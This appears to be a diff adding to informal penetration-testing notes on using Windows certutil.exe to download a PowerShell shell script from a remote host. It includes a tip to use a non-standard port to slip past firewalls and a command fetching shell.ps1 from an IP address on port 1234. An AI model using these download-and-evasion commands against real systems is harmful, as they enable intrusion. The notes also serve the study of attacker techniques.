@@ -5,4 +5,7 @@ cause some red flags.
 
 certutil.exe -urlcache -split -f http:///shell.ps1
 
+on windows, sometimes firewalls can be a little tricky, its ALWAYS best to specify
+the port number, usually i like to use a non standard port like so:
 
+certutil.exe -urlcache -split -f http://10.50.78.32:1234/shell.ps1
